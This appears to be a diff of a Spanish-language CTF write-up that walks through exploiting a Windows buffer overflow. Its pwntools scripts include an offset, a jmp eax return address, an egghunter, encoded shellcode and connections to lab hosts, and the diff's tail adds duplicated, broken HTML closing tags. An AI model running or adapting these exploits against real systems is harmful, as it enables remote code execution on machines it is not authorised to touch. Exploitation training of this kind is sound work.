@@ -677,9 +677,9 @@ Hold on...
 offset </span><span class="o">= </span><span class="mi">66</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> * </span><span class="p">offset
 
-jmpeax </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)
-
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpeax
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])
 
@@ -811,9 +811,10 @@ recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s"
 offset </span><span class="o">= </span><span class="mi">66</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(recv))
 
-jmpeax </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)
-
-payload </span><span class="o">= </span><span class="p">recv </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpeax
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> recv
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])
 
@@ -1034,9 +1035,10 @@ recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s"
 offset</span><span class="o"> =</span><span class="mi"> 66</span><span class="p">
 junk</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"nop"</span><span class="p">)</span><span class="o"> *</span><span class="p"> (offset</span><span class="o"> -</span><span class="no"> len</span><span class="p">(recv))
 
-jmpeax</span><span class="o"> =</span><span class="p"> p32(</span><span class="mi">0x719023b3</span><span class="p">)
-
-payload</span><span class="o"> =</span><span class="p"> recv</span><span class="o"> +</span><span class="p"> junk </span><span class="o">+ </span><span class="p">jmpeax
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> recv
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
 
 shellcode</span><span class="o"> = </span><span class="no"> b</span><span class="s">""</span><span class="p">
 shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xbf\x1c\x81\x88\x34\xda\xd6\xd9\x74\x24\xf4</span><span class="s">"</span><span class="p">
@@ -1140,8 +1142,6 @@ recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s"
 offset </span><span class="o">= </span><span class="mi">66</span><span class="p">
 junk</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"nop"</span><span class="p">)</span><span class="o"> *</span><span class="p"> (offset</span><span class="o"> -</span><span class="no"> len</span><span class="p">(recv))
 
-jmpeax </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)
-
 shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""
 </span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb8\x7d\xe5\x1d\x63\xdb\xcf\xd9\x74\x24\xf4</span><span class="s">"
 </span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5e\x29\xc9\xb1\x52\x31\x46\x12\x03\x46\x12</span><span class="s">"
@@ -1174,9 +1174,12 @@ shellcode </span><span class="o">=  </span><span class="no">b</span><span class=
 </span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x39\x90\x9f\x91\xf6\x74\x28\xea\xea\xe4\xd7</span><span class="s">"
 </span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x21\xaf\x05\x3a\xe3\xda\xad\xe3\x66\x67\xb0</span><span class="s">"
 </span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x13\x5d\xa4\xcd\x97\x57\x55\x2a\x87\x12\x50</span><span class="s">"
-</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x76\x0f\xcf\x28\xe7\xfa\xef\x9f\x08\x2f</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x76\x0f\xcf\x28\xe7\xfa\xef\x9f\x08\x2f</span><span class="">"
 
-</span><span class="p">payload </span><span class="o">= </span><span class="p">recv </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpeax
+</span><span class="p">payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> recv
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.11.115"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)
 
@@ -1344,7 +1347,7 @@ Content source: 1 (target), length: 18d6</span>
 
 <p class="plain-text">Nuevamente para evitar problemas o solaparnos con el stack en el poco espacio que nos queda haremos que este un poco mas arriba restandole <code class="language-plaintext highlighter-rouge">0x64</code> bytes</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">subesp </span><span class="o">= </span><span class="p">asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)</span>
+<code><span class="p">asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Ahora con mona creamos el <code class="language-plaintext highlighter-rouge">egghunter</code>, algo a tener en cuenta es que aunque el binario es <code class="language-plaintext highlighter-rouge">x86</code> la maquina victima es <code class="language-plaintext highlighter-rouge">x64</code> asi que tenemos que incluir un <code class="language-plaintext highlighter-rouge">-wow64</code></p>
@@ -1367,6 +1370,7 @@ Hold on...
 <p class="plain-text">El <code class="language-plaintext highlighter-rouge">egghunter</code> lo que hara sera buscar en toda la memoria la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> y ejecutar todo lo que esta despues que en este caso sera nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, el funcionamiento de este egghunter ya fue analizado en otro <a href="/exploit-development/windows-user/egghunters#wow64">post</a> sobre explotación</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">egghunter  </span><span class="o">= </span><span class="no">b</span><span class="s">""
+</span><span class="p">egghunter </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
 </span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x42\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53</span><span class="s">"  
 </span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05</span><span class="s">"  
 </span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7\xff\xe7</span><span class="s">"  </span>
@@ -1375,9 +1379,12 @@ Hold on...
 <p class="plain-text">Para el payload final enviaremos el <code class="language-plaintext highlighter-rouge">egghunter</code>, la basura y saltaremos a <code class="language-plaintext highlighter-rouge">eax</code> donde esta el egghunter, dejamos <code class="language-plaintext highlighter-rouge">4</code> bytes de espacio y despues enviamos el <code class="language-plaintext highlighter-rouge">egg</code> seguido del <code class="language-plaintext highlighter-rouge">shellcode</code> para que este se guarde en algun lugar de toda la memoria</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
-payload </span><span class="o">+= </span><span class="p">subesp </span><span class="o">+ </span><span class="p">egghunter </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpeax
-payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">4</span><span class="p">
-payload </span><span class="o">+= </span><span class="p">egg </span><span class="o">+ </span><span class="p">shellcode</span>
+payload </span><span class="o">+= </span><span class="p">egghunter </span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">4</span><span class="c1">        # padding</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"w00t"</span><span class="o"> *</span><span class="mi"> 2</span><span class="c1">     # egg</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">shellcode</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Para verificar que funciona usaremos el shellcode para una calculadora antes creado y ejecutamos el exploit, como resultado abrimos una calculadora en el equipo</p>
@@ -1389,19 +1396,14 @@ payload </span><span class="o">+= </span><span class="p">egg </span><span class=
     log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)
     sys.exit(</span><span class="mi">1</span><span class="p">)
 
-subesp</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
-
 egghunter  </span><span class="o">= </span><span class="no">b</span><span class="s">""
+</span><span class="p">egghunter </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
 </span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x42\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53</span><span class="s">"  
 </span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05</span><span class="s">"  
 </span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7\xff\xe7</span><span class="s">"  
 </span><span class="p">
 offset </span><span class="o">=</span><span class="mi"> 66</span><span class="p">
-junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">-</span><span class="no"> len</span><span class="p">(egghunter</span><span class="o"> +</span><span class="p"> subesp))
-
-jmpeax</span><span class="o"> =</span><span class="p"> p32(</span><span class="mi">0x719023b3</span><span class="p">)
-
-egg</span><span class="o"> =</span><span class="no"> b</span><span class="s">"w00t"</span><span class="o"> *</span><span class="mi"> 2</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">-</span><span class="no"> len</span><span class="p">(egghunter))
 
 shellcode</span><span class="o"> = </span><span class="no"> b</span><span class="s">""</span><span class="p">
 shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xbf\x1c\x81\x88\x34\xda\xd6\xd9\x74\x24\xf4</span><span class="s">"</span><span class="p">
@@ -1425,10 +1427,13 @@ shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class=
 shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa3\xc0\x24\xe4\x63\x38\x54\x75\x06\x3e\xcb</span><span class="s">"</span><span class="p">
 shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x76\x03\x5d\x8a\xe4\xcf\x8c\x29\x8d\x6a\xd1</span><span class="s">"</span><span class="p">
 
-payload </span><span class="o"> = </span><span class="no">b</span><span class="s">""</span><span class="p">
-payload </span><span class="o">+= </span><span class="p">subesp </span><span class="o">+</span><span class="p"> egghunter</span><span class="o"> +</span><span class="p"> junk</span><span class="o"> +</span><span class="p"> jmpeax
-payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">*</span><span class="mi"> 4</span><span class="p">
-payload </span><span class="o">+= </span><span class="p">egg</span><span class="o"> +</span><span class="p"> shellcode
+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">egghunter </span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">4</span><span class="c1">        # padding</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"w00t"</span><span class="o"> *</span><span class="mi"> 2</span><span class="c1">     # egg</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">shellcode
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])
 
@@ -1445,19 +1450,14 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your 
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm
 
-subesp </span><span class="o">= </span><span class="p">asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
-
-</span><span class="p">egghunter  </span><span class="o">= </span><span class="no">b</span><span class="s">""
+egghunter  </span><span class="o">= </span><span class="no">b</span><span class="s">""
+</span><span class="p">egghunter </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
 </span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x42\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53</span><span class="s">"  
 </span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05</span><span class="s">"  
 </span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7\xff\xe7</span><span class="s">"  
 </span><span class="p">
 offset </span><span class="o">= </span><span class="mi">66</span><span class="p">
-junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(subesp + egghunter))
-
-jmpeax </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)
-
-egg </span><span class="o">= </span><span class="no">b</span><span class="s">"w00t" </span><span class="o">* </span><span class="mi">2</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(egghunter))
 
 shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""
 </span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb8\x7d\xe5\x1d\x63\xdb\xcf\xd9\x74\x24\xf4</span><span class="s">"
@@ -1494,9 +1494,12 @@ shellcode </span><span class="o">=  </span><span class="no">b</span><span class=
 </span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x76\x0f\xcf\x28\xe7\xfa\xef\x9f\x08\x2f</span><span class="s">"
 </span><span class="p">
 payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
-payload </span><span class="o">+= </span><span class="p">subesp </span><span class="o">+ </span><span class="p">egghunter </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpeax
-payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">4</span><span class="p">
-payload </span><span class="o">+= </span><span class="p">egg </span><span class="o">+ </span><span class="p">shellcode
+payload </span><span class="o">+= </span><span class="p">egghunter </span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">4</span><span class="c1">        # padding</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"w00t"</span><span class="o"> *</span><span class="mi"> 2</span><span class="c1">     # egg</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">shellcode
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.11.115"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)
 
@@ -1615,9 +1618,10 @@ dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">
 offset</span><span class="o"> =</span><span class="mi"> 66</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(dll))
 
-jmpeax</span><span class="o"> =</span><span class="p"> p32(</span><span class="mi">0x719023b3</span><span class="p">)
-
-payload</span><span class="o"> =</span><span class="p"> dll </span><span class="o">+ </span><span class="p">junk</span><span class="o"> +</span><span class="p"> jmpeax
+</span><span class="p">payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> dll
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
 
 shell</span><span class="o"> = </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])
 
@@ -1737,9 +1741,10 @@ dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">
 offset</span><span class="o"> =</span><span class="mi"> 66</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(dll))
 
-jmpeax</span><span class="o"> =</span><span class="p"> p32(</span><span class="mi">0x719023b3</span><span class="p">)
-
-payload</span><span class="o"> =</span><span class="p"> dll </span><span class="o">+ </span><span class="p">junk</span><span class="o"> +</span><span class="p"> jmpeax
+</span><span class="p">payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> dll
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.11.115"</span><span class="p">,</span><span class="mi"> 9999</span><span class="p">)
 
@@ -1835,6 +1840,19 @@ PS C:\Users\Administrator\Documents></span>
 
 <script type="text/javascript" src="/js/jquery.min.js"></script>
 <script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
+
+</html>
+>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
+4953382991917"></script>
 
     </div>
   </body>
